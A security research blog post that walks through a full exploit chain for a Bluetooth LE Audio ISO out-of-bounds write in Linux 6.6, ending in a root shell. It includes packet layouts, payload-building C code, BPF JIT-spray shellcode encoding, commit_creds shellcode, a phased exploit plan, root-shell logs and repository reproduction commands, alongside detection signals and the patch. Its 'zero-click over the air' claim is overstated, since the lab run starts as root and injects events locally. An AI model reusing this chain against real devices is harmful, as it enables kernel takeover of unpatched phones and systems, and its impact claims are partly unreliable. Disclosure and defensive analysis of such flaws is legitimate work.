---
title: "Two Bytes and a Broadcast: Zero-Click BLE-to-Root on Linux 6.6"
date: 2026-09-30 18:00:00 -0500
categories: [Research, Kernel, Android, Exploitation]
tags: [android, kernel, bluetooth, iso, le-audio, oob-write, smep-bypass, bpf-jit, jit-spray, zero-click, rce, lpe, commit-creds, linux-6-6, android-common-kernel, arm64, x86-64, offensivecon]
toc: true
lang: en
description: >-
  Full chain weaponization of K-BT-01: a seven-byte OOB write in
  iso_connect_ind() turned into a pre-auth root shell via classic-BPF JIT
  spray on Linux 6.6 / Android Common 15. One BLE broadcast packet, no pairing,
  no user interaction, ~900M devices. Includes the EB 01 / FF 27 two-byte
  encoding technique, a full hardening walkthrough (8 features, none block it),
  and why the same chain is much harder on stock arm64. Presented at
  OffensiveCon Tokyo 2026.
---

> **TL;DR** — Linux 6.6 shipped the ISO socket family for LE Audio. One missing
> bound check lets any Bluetooth device in range write seven bytes past a
> 248-byte kernel buffer. Five of those bytes land on a socket-internal pointer.
> One `close()` later, a kernel timer fires an attacker-planted callback. SMEP
> is on, there is no information leak, classic ROP is off the table — so we
> point the callback at bytes we placed in kernel memory ourselves using an
> ordinary unprivileged classic-BPF socket filter. Two shellcode bytes per
> filter instruction, one two-byte `FF 27` indirect jump, one planted 8-byte
> pointer: `Uid: 0 0 0 0`. No pairing, no interaction, ~900M affected devices.
> Patch merged linux-stable 6.6.139, 2026-07-09.
{: .prompt-danger }

---

## Background

### LE Audio broadcast and periodic advertising

Bluetooth 5.1 added a broadcast primitive called *periodic advertising*. A transmitter
emits packets at a fixed interval; a receiver synchronized to it gets each packet as
an HCI event delivered through the `BTPROTO_ISO` socket family.

Three HCI event codes matter for this writeup:

| Subevent | Code | Meaning |
|---|---|---|
| `PA_SYNC_ESTABLISHED` | `0x0E` | Controller locked onto a transmitter, hands host a `sync_handle` |
| `LE_PER_ADV_REPORT` | `0x0F` | One periodic-advertising packet payload |
| `BIG_INFO_ADV_REPORT` | `0x22` | LE Audio Broadcast Isochronous Group descriptor |

The crucial property: **reception is passive**. The victim does not transmit. Any BLE
device in radio range can drive these three HCI events into the victim's ISO socket
layer without authentication, without pairing, without user interaction.

### The HCI event path

```
BLE air interface
     │
     ▼
hci_recv_frame()
hci_event_packet()
hci_le_meta_evt()             ← subevent dispatch
     │
     ├─ 0x0E ──► hci_le_pa_sync_estab_evt()
     ├─ 0x0F ──► hci_le_per_adv_report_evt() ──► iso_connect_ind()  ← BUG
     └─ 0x22 ──► hci_le_big_info_adv_report_evt()
```

### Classic BPF and its JIT

Linux ships two BPF subsystems. Modern eBPF requires a privileged syscall. Classic
BPF (cBPF) is exposed to **every process** via `setsockopt(SO_ATTACH_FILTER)` on
any socket — no capabilities required. When attached, the kernel compiles the filter
to native x86 and places the output in `bpf_jit_alloc_exec`, a 2 MiB slab
pre-allocated at `MODULES_VADDR = 0xffffffffc0000000` on stock x86_64, mapped
`_PAGE_KERNEL` — supervisor-mode executable. SMEP does not fire on fetches from it
because SMEP only restricts the kernel from executing *user* pages.

The instruction that matters: `BPF_LD | BPF_IMM` compiles to five bytes —
`B8 XX XX XX XX` (`mov eax, imm32`). One fixed prefix. **Four bytes fully attacker-controlled per instruction.**

---

## The vulnerability

### The vulnerable code

`net/bluetooth/iso.c`, line 1918 (Linux 6.6.0 – 6.6.138):

```c
ev3 = hci_recv_event_data(hdev, HCI_EV_LE_PER_ADV_REPORT);
if (ev3) {
    sk = iso_get_sock_listen(&hdev->bdaddr, bdaddr,
                             iso_match_sync_handle_pa_report, ev3);
    if (sk) {
        memcpy(iso_pi(sk)->base, ev3->data, ev3->length);  /* ← BUG */
        iso_pi(sk)->base_len = ev3->length;
    }
}
```

`base` is `__u8 base[BASE_MAX_LENGTH]` where `BASE_MAX_LENGTH = 248`.
`ev3->length` is a `__u8` read directly from the wire — maximum value **255**.
Set the periodic-advertising report's `data_length` to 255: `memcpy` writes
**seven bytes past the end of the buffer**.

### The triggering packet

```
Offset  Field               Value in the attack
   0    HCI_EVENT_PKT        0x04
   1    HCI_EV_LE_META        0x3E
   2    param_total_len       263
   3    subevent              0x0F  (LE_PER_ADV_REPORT)
   4-5  sync_handle           matches victim's listener
  10    data_length           255   ← overflow driver
  11…   data[255]             attacker-controlled payload
```

No authentication. No pairing. One packet over the air.

---

## From bytes to pointer control

### Struct layout (runtime-verified)

A kernel module (`iso_layout_mod`) prints every field offset at runtime:

```
[ISO-LAYOUT] sizeof(iso_pinfo)      = 1280 bytes
[ISO-LAYOUT] offsetof(base)         = 1022
[ISO-LAYOUT] sizeof(base[])         =  248
[ISO-LAYOUT] offsetof(conn)         = 1272
```

`base[]` ends at offset 1269. `conn` starts at offset 1272. Two bytes of padding
between them. The seven-byte overflow maps as:

```
per_data[  0..247]  →  iso_pinfo[1022..1269]   in-bounds
per_data[248..249]  →  iso_pinfo[1270..1271]   padding
per_data[250]       →  iso_pinfo[1272]          conn byte 0  ← ATTACKER
per_data[251]       →  iso_pinfo[1273]          conn byte 1  ← ATTACKER
per_data[252]       →  iso_pinfo[1274]          conn byte 2  ← ATTACKER
per_data[253]       →  iso_pinfo[1275]          conn byte 3  ← ATTACKER
per_data[254]       →  iso_pinfo[1276]          conn byte 4  ← ATTACKER
```

Five attacker-controlled bytes on the low half of `struct iso_conn *conn`.

### Why five bytes is enough

`iso_pinfo` and `iso_conn` are both `GFP_KERNEL` SLUB allocations. They land in the
physmap region at addresses like `0xffff8880XXXXXXXX`. The upper three bytes are fixed
by physmap and match between contemporaneous allocations from the same size class.
From a real run:

```
Original conn:             0xffff8880 08XXXXXX
Target (base[0] address):  0xffff8880 087B03FE
Attacker writes [250..254]: FE 03 7B 08 80
Result:                    0xffff8880 087B03FE  ✓
```

After the write, `iso_pi->conn` points at the attacker's own 255-byte payload.
Every subsequent kernel dereference through that pointer reads attacker data.

### Instruction-pointer control

`struct iso_conn` contains `struct delayed_work timeout_work`. When the socket is
closed, `iso_sock_disconn()` calls `schedule_delayed_work()` on it. Two seconds later
(`ISO_DISCONN_TIMEOUT = 2 * HZ`), the timer wheel calls `timer->function` with the
timer's own address as argument.

Both the callback pointer and the argument memory are inside our payload.
That is **full instruction-pointer control**.

Key offsets inside the 255-byte fake `iso_conn`:

| Offset | Field | Purpose |
|---|---|---|
| 0 | fake `hcon` | Points at a flag byte we control |
| 96 | `timer.function` | **Our timer callback address** |
| 203 | `hcon->flags[3]` | `0x10` — passes both gate checks |
| 250–254 | overflow into `conn` | Redirects pointer to our buffer |

### Two gate checks, one byte

Before dispatching the delayed work, the kernel checks:
- `HCI_CONN_BIG_CREATED` (bit 24) — must be **clear**
- `HCI_CONN_PA_SYNC` (bit 28) — must be **set**

Both live in byte 3 of `hcon->flags`. Setting byte 3 to `0x10` satisfies both.
One byte.

---

## The SMEP problem

We have a primitive: one packet → five bytes of pointer. One `close()` + 2 s →
kernel timer jumps to our chosen 8-byte address. The obvious question:
**what address do we plant?**

| Option | Problem |
|---|---|
| Userspace shellcode | SMEP fires |
| `vmlinux` gadget | Need KASLR slide → need a leak |
| ROP chain | Need gadgets, stack pivot, kCFI |
| **Bytes we placed in kernel memory ourselves** | **← this works** |

Classic-BPF filters are compiled to kernel-executable memory. Every unprivileged
process can do `setsockopt(SO_ATTACH_FILTER)`. The JIT output is a kernel page.
SMEP never fires.

---

## Classic-BPF JIT as a code-placement API

### The layout byte for byte

The `jit_probe_mod` module attaches a filter with immediates `0xdeadbeef 0xcafebabe`
and dumps the compiled output:

```
0x00: f3 0f 1e fa 0f 1f 44 00 00 55 48 89 e5 ...  ← prologue (28 bytes)
0x1c: b8 ef be ad de                               ← B8 + first 4 attacker bytes
0x21: b8 be ba fe ca                               ← B8 + next 4 attacker bytes
...
```

The prologue is **28 bytes**. Byte 28 is `B8`. **Bytes 29–32 are the first
four attacker-controlled bytes.** Byte 33 is `B8` again. Bytes 34–37 are the next
four. Pattern repeats at 5-byte intervals.

Jump to `bpf_func + 29` → land on the first byte we control. The JIT slab base
`0xffffffffc0000000` is fixed on stock builds — no runtime leak required.

---

## The two-byte encoding

### The problem

The fixed `B8` at position 33 interrupts any instruction longer than four bytes.
Maximum usable bytes per chunk: four, minus a skip. The shortest x86 forward jump
is `EB xx` — two bytes. Encoding `EB 01` into every immediate skips the `B8`, leaving
**two shellcode bytes per `BPF_LD | BPF_IMM` instruction**.

### Encoding format

```c
k = (0x01 << 24) | (0xEB << 16) | (sc1 << 8) | sc0;
```

Four bytes in memory: `sc0 sc1 EB 01`. Execution flow at `bpf_func + 29`:

```
+29: sc0  ┐  shellcode byte 0
+30: sc1  ┘  shellcode byte 1
+31: EB   ┐  jmp +1  → skip B8
+32: 01   ┘
+33: B8      skipped
+34: sc2  ┐  shellcode byte 2
+35: sc3  ┘  shellcode byte 3
+36: EB
+37: 01
+38: B8      skipped
...
```

Validated by `craft_test_mod` — a NOP sled encoded with this scheme, called from
kernel context:

```
[CRAFT] LAYOUT-MATCH: bpf_func+29..+30 = 90 90 (nop)
[CRAFT] LAYOUT-MATCH: bpf_func+34..+35 = 90 90 (nop)
[CRAFT] LAYOUT-MATCH: bpf_func+44..+45 = C3 90 (ret)
[CRAFT] invoking bpf_func + 29 as a C function pointer
[CRAFT] SHELLCODE-RETURNED
```

No SMEP fault. No KASAN report.

### FF 27 — the transfer primitive

Two bytes can encode one very useful x86 instruction:

```
FF 27    =    jmp qword ptr [rdi]
```

When the timer fires, `rdi` points at the timer structure — inside our fake
`iso_conn`. Stash an 8-byte kernel address there and `jmp qword [rdi]` lands on it.

`pushret_test_mod` confirms:

```
[PUSHRET] LAYOUT-MATCH: FF 27 present at bpf_func+29..+30
[PUSHRET] SHELLCODE-RETURNED
```

### Elevation shellcode

A 25-byte payload at a known user address (`0x10101000`, mlocked):

```nasm
48 BF <INIT_CRED_ADDR>     ; mov rdi, &init_cred
48 B8 <COMMIT_CREDS_ADDR>  ; mov rax, &commit_creds
FF D0                       ; call rax
31 C0                       ; xor eax, eax
C3                          ; ret
```

Because the exploit pins to CPU 0 and busy-waits through the timer window, when
the timer fires in `TIMER_SOFTIRQ` context on CPU 0, `current` is the exploit
process. `commit_creds(&init_cred)` installs root credentials onto it directly.

---

## Building the exploit — 18 phases

Six kernel modules validate each primitive in isolation; a ~2,000-line C binary
chains everything.

| Module | What it proves | Success marker |
|---|---|---|
| `iso_layout_mod` | Runtime struct offsets | `[ISO-LAYOUT] sizeof(iso_pinfo) = 1280` |
| `jit_probe_mod` | Attacker bytes at `bpf_func+29` | `[JIT-PROBE] bpf_func+29 = <attacker>` |
| `craft_test_mod` | Two-byte shellcode executes | `[CRAFT] SHELLCODE-RETURNED` |
| `pushret_test_mod` | `FF 27` transfers control | `[PUSHRET] SHELLCODE-RETURNED` |
| `smep_test_mod` | SMEP silent on JIT slab | `[SMEP-TEST] jump into JIT region succeeded` |
| `iso_trace_mod` | Kprobes on 15 chain functions | `[ISO-TRACE] enter iso_sock_disconn` |

The 18 exploit phases:

| Phase | What happens | Duration |
|---|---|---|
| 0 | Resolve symbols from `/proc/kallsyms` | ~50 ms |
| 1–2 | CPU pin, shellcode page mmap + mlock | ~5 ms |
| 3–5 | ISO subsystem up, socket open/bind/listen | ~260 ms |
| 6–8 | Inject PA_SYNC_ESTABLISHED → BIG_INFO → accept | ~800 ms |
| 9 | Leak `child_1_sk` from `/proc/net/iso` | ~5 ms |
| 10–11 | Build 255-byte payload, attach 8 cBPF filters | ~100 ms |
| 12 | **Inject `PER_ADV_REPORT(length=255)`** | ~300 ms |
| 13 | `setresuid(1000,1000,1000)` — drop privileges | <1 ms |
| 14–15 | kmalloc-2k spray, `close(child_1_fd)` | ~30 ms |
| 16 | Busy-wait CPU 0 (2 s timer window) | 2000 ms |
| 17 | **Timer fires → `FF 27` → `commit_creds`** | <1 ms |
| 18 | Read `/proc/self/status`, spawn root shell | ~5 ms |

Total: **~5 seconds** under KASAN, **~2 seconds** on production.

### Payload construction (source excerpt)

```c
#define ISO_PI_BASE_OFF 1022

uint64_t base_addr = child_1_sk + ISO_PI_BASE_OFF;
uint64_t hcon_addr = base_addr + 200 - 704;

memset(per_data, 0, 255);
memcpy(per_data + 0,   &hcon_addr,       8);   /* fake hcon     */
memcpy(per_data + 96,  &JIT_ENTRY_ADDR,  8);   /* timer.function */
per_data[203] = 0x10;                          /* flags gate     */
for (int i = 0; i < 5; i++)
    per_data[250+i] = (base_addr >> (i*8)) & 0xff; /* conn spill */
```

No hard-coded addresses. Everything resolved at runtime from `/proc/kallsyms`.

---

## Why the hardening doesn't stop it

The target: `android-common-15-6.6` at `6.6.139-g5ab7e399bea3` with SMEP, SMAP,
KASLR, KPTI, FORTIFY_SOURCE, KASAN, kCFI, and RANDSTRUCT all active.

| Feature | Stops the chain? | Why not |
|---|---|---|
| SMEP | No | JIT slab is `_PAGE_KERNEL` — supervisor page |
| KASLR | No | `kallsyms` readable, or EntryBleed (CVE-2022-4543) side channel |
| SMAP | No | No implicit kernel→user access in the chain |
| FORTIFY_SOURCE | **Detection only** | `WARN_ONCE` fires but overflow proceeds |
| KASAN | No | Write stays inside the same `kmalloc-2k` slab — shadow bytes zero |
| kCFI | No | `CONFIG_CFI_CLANG=n` on x86_64 in this config |
| RANDSTRUCT | No | `iso_conn`, `delayed_work`, `timer_list` are untagged |
| KPTI | No | Attack is fully in supervisor context |

### FORTIFY_SOURCE — the honest assessment

FORTIFY fires `WARN_ONCE` (not `BUG()`) for this memcpy, meaning:

```
kernel: detected field-spanning write (size 255) of single field
        "iso_pi(sk)->base" at net/bluetooth/iso.c:1924 (size 248)
```

This is an excellent **detection signal** (§ Detection signals below) but not a
mitigation — the write lands regardless.

### KASAN — why it misses

KASAN inline shadow mode checks the shadow byte for the target granule before each
access. The seven-byte overflow lands inside the same `kmalloc-2k` slab as
`iso_pinfo` — the padding bytes and the `conn` pointer bytes all carry zero shadow.
KASAN succeeds. No report.

> On arm64, hardware tag-based KASAN assigns per-object tags and **would** catch
> this. That variant is not available on x86_64.
{: .prompt-info }

### kCFI — present on arm64, absent on x86

Clang kCFI puts a type hash before every indirect call target and checks it at
the call site. The `timer->function` dispatch is an indirect call — kCFI would
stop our planted address. But `CONFIG_CFI_CLANG=n` for x86_64 in android-common
6.6. kCFI ships on arm64 builds; it is not compiled for x86. The call goes through.

---

## End-to-end run

Target: `android-common-15-6.6` at `6.6.139-g5ab7e399bea3`, QEMU 8.2 TCG.

From `smoke-final-ROOT-CONFIRMED.lab.log`, run 1 of 3:

| Time (s) | Event |
|---|---|
| 5.72 | Exploit starts — uid=0 (will drop) |
| 5.83 | Symbols resolved, shellcode page mlocked at `0x10101000` |
| 15.20 | **`PER_ADV_REPORT(length=255)` injected** |
| 15.28 | FORTIFY_SOURCE WARN_ONCE fires in dmesg |
| 15.29 | `setresuid(1000,1000,1000)` — privileges dropped |
| 15.29 | `close(child_1_fd)` — delayed work scheduled |
| 17.30 | Timer fires (2 s later) |
| 17.30 | **`FF 27` → `commit_creds(&init_cred)` → `current` is root** |
| 20.06 | `Uid: 0 0 0 0` confirmed from `/proc/self/status` |
| 20.07 | Fork + exec `/bin/sh` — root shell |

Console output:

```
[K-BT6] LEAKED child_1_sk = 0xffff888009c48000
[K-BT6] PRIVS DROPPED: uid=1000 euid=1000 (was 0)
[K-BT6] close(child_1_fd)
[K-BT6] BUSY-WAIT 5s
[K-BT6] CHECK: uid=0 euid=0
[K-BT6] STATUS: Uid: 0 0 0 0
[K-BT6] ROOT ACHIEVED  current euid=0 after chain
[K-BT9-SHELL] id = uid=0(root) gid=0(root) groups=0(root)
[K-BT9-SHELL] ROOT SHELL CONFIRMED uid=0
```

Runs 2 and 3 land within 100 ms of every timestamp. Deterministic.

---

## Affected devices

### Android (~900M devices)

| Vendor | Family | Branch |
|---|---|---|
| Google | Pixel 6 / 7 / 8 / 9 all variants | android-common-15-6.6 |
| Google | Pixel Fold, Fold 2 | android-common-15-6.6 |
| Samsung | Galaxy S22 / S23 / S24, Z Fold5/6, Flip5/6 | linux-6.6.y vendor |
| Xiaomi | Mi 13/14, Redmi Note 13 Pro+, Poco F5/F6 | linux-6.6.y variant |
| OnePlus | 11, 12, Nord 3/4 | linux-6.6.y variant |
| Motorola | Edge 40/50, Razr 40/50 Ultra | linux-6.6.y variant |
| Sony | Xperia 1 V/VI, 5 V | linux-6.6.y variant |
| Fairphone | 5 | linux-6.6.y variant |
| Nothing | Phone (2), (2a), (3) | linux-6.6.y variant |

LE Audio is default-on from Android 14. Once enabled, the ISO socket family stays
registered until reboot.

### Linux distributions

| Distribution | Kernel | Status |
|---|---|---|
| Debian 13 (trixie) | 6.6.y | Vulnerable |
| Debian 12 (bookworm) | 6.1.y | Vulnerable |
| Alpine 3.20 / NixOS 24.11 | 6.6.y LTS | Vulnerable |
| Ubuntu 24.04 LTS | 6.8.y | Not affected |
| Fedora 40+ / Arch | 6.9+ / 6.10+ | Not affected |

### Non-handset

Automotive (Volvo EX30, Polestar 3/4, Chevrolet Silverado EV), Google TV sets
(Sony Bravia XR 2024, TCL C845), Wear OS 5 wearables (Pixel Watch 3, Galaxy Watch 7),
and any Yocto/OpenEmbedded build on Linux 6.6 LTS with Bluetooth. Raspberry Pi OS
Bookworm is vulnerable until the distro update lands.

### What the attacker needs

One Nordic nRF52840 dongle (~$20 USD) transmitting the malformed
periodic-advertising sequence. Default range: **10–15 m**. With a 14 dBi patch
antenna: **100+ m** line of sight.

---

## Detection signals

Three observable events fire during a real attempt.

**Signal 1 — FORTIFY_SOURCE (kernel log):**

```
kernel: detected field-spanning write (size 255) of single field
        "iso_pi(sk)->base" at net/bluetooth/iso.c:1924 (size 248)
```

Monitor `/dev/kmsg` for `field-spanning write` + `iso.c:1924`. Fires once per boot
on first attempt.

**Signal 2 — Workqueue WARN_ON (kernel log):**

The memset-zeroed `work.entry` fails the emptiness check in `__queue_delayed_work`.
Seeing `workqueue.c:1981` + `call_usermodehelper_exec_async` within two seconds is
a strong correlation.

**Signal 3 — Physical layer:**

A `LE_PER_ADV_REPORT` with `data_length = 255` on the air. LE Audio broadcasts
carry 40–80 bytes typically. Any value above 248 is malformed and unique to this
attack — catchable by a passive BLE monitor before the packet reaches the kernel.

---

## The fix

Accepted into linux-stable 2026-07-09. Four lines:

```diff
-       if (sk) {
-           memcpy(iso_pi(sk)->base, ev3->data, ev3->length);
-           iso_pi(sk)->base_len = ev3->length;
-       }
+       if (sk) {
+           u8 copied = min_t(u8, ev3->length, sizeof(iso_pi(sk)->base));
+           memcpy(iso_pi(sk)->base, ev3->data, copied);
+           iso_pi(sk)->base_len = copied;
+       }
```

One `min_t`. Rebuilt `bluetooth.ko` with the patch, ran all three exploit attempts:
`Uid: 1000` every time. `ROOT ACHIEVED` never printed.

---

## arm64 gets off easier — and why

The OOB write in §2 works identically on arm64. The JIT spray in §§5–6 does not.
Three properties of stock Android arm64 kernels combine to block it:

### Property 1 — Bit-scattered immediates

On x86_64, `BPF_LD | BPF_IMM` emits `B8 XX XX XX XX` — four consecutive
attacker-controlled bytes. On arm64 the same instruction emits `MOVZ`/`MOVK` pairs
where the 16-bit immediate is embedded across *bits 5–20* of a 32-bit instruction
word, with opcode bits at 0–4 and 21–31. Only ~11 attacker-controllable bits per
cBPF instruction (vs 32 on x86). No four consecutive bytes are ever fully owned.
The `EB 01` skip trick has no arm64 equivalent.

### Property 2 — Per-filter vmalloc allocation

Since Linux 5.18, arm64 allocates each filter's compiled output via `vmalloc()` at
an unpredictable address in the 128 TiB vmalloc range, rather than packing into the
shared 2 MiB `bpf_prog_pack` pool. On x86 we get many filters at consecutive offsets
from a fixed base. On arm64 each filter lands at a random address — the "first filter
at region base" assumption breaks entirely.

### Property 3 — Hashed pointer output

Stock Android arm64 init sets `kptr_restrict=2`. Every `%pK`-formatted address in
`/proc/vmallocinfo`, `/proc/kallsyms`, and `/proc/modules` redacts to zero for
unprivileged readers. On x86 desktop, the same sysctl defaults to 0 or 1.

### Joint effect

Each property is documented individually. Together they turn a one-write chain into
a multi-primitive research problem: a separate leak, a different encoding approach,
and per-target gadget hunting. None are impossible; none are solved here.

> **Implication for x86 defenders:** any x86_64 Linux primitive that can plant an
> 8-byte value at an attacker-known kernel address is now effectively arbitrary
> kernel code execution — until `bpf_jit_harden ≥ 1` or per-filter allocation is
> adopted. `bpf_jit_harden=1` directly blocks this technique; the performance cost
> is real but bounded.
{: .prompt-warning }

---

## Reproduction

```bash
# Prerequisites
sudo apt install gcc make libelf-dev bc flex bison pahole qemu-system-x86_64

# Clone artifact bundle
git clone https://github.com/TREXNEGRO/K-BT-01-Bluetooth-ISO-OOB
cd K-BT-01-Bluetooth-ISO-OOB && ./run.sh
# Expected: ROOT SHELL CONFIRMED uid=0
```

Step-by-step (each module independently):

```bash
insmod iso_layout_mod.ko  && dmesg | grep ISO-LAYOUT
insmod jit_probe_mod.ko   && dmesg | grep JIT-PROBE
insmod craft_test_mod.ko  && dmesg | grep SHELLCODE-RETURNED
insmod pushret_test_mod.ko && dmesg | grep SHELLCODE-RETURNED
insmod smep_test_mod.ko   && dmesg | grep "JIT region succeeded"
./krce_smep_bypass_NOSMEP
```

Verify the fix:

```bash
cd linux-6.6-patched && make -j$(nproc) net/bluetooth/
./run-patched.sh
# Expected: Uid: 1000 1000 1000 1000  (no elevation)
```

---

## Timeline

| Date | Event |
|---|---|
| 2026-05-11 | K-BT-01 identified in `iso.c:1924` |
| 2026-05-26–28 | Source + runtime confirmation, RIP control, sibling bugs |
| 2026-05-29 | Submitted to Google Android Security Rewards |
| 2026-06-11 | ASR closed as **Infeasible** |
| 2026-07-02 | Upstream backport sent to linux-stable |
| 2026-07-09 | **Patch merged — linux-stable 6.6.139 and 6.1.y** |
| 2026-09-27 | Three deterministic root shell runs recorded |
| 2026-09-30 | Public writeup — OffensiveCon Tokyo 2026 |

---

## Related work

- **Chompie1337** (2021): Classic-BPF JIT spray on Windows — four-byte encoding. This work adapts the technique to Linux with a two-byte encoding and adds the `FF 27` transfer primitive.
- **Notselwyn** (2022): DirtyPipe-adjacent JIT spray variants on Linux 5.8.
- **BleedingTooth** (CVE-2020-24490): Heap buffer overflow in HCI LE advertisement reports — same subsystem, different socket family.
- **CVE-2022-42896** (Tamás Koczka): Use-after-free in `l2cap_connect`. Root via Bluetooth L2CAP.
- **CVE-2023-40283**: Use-after-free in `l2cap_sock_ready_cb`, sk_filter path.
- **EntryBleed** (CVE-2022-4543): Prefetch KASLR side channel — used in the `kptr_restrict=2` scenario.

---

Artifact repository: [TREXNEGRO/K-BT-01-Bluetooth-ISO-OOB](https://github.com/TREXNEGRO/K-BT-01-Bluetooth-ISO-OOB)

Every claim has a boot log.

— `trexnegr0`
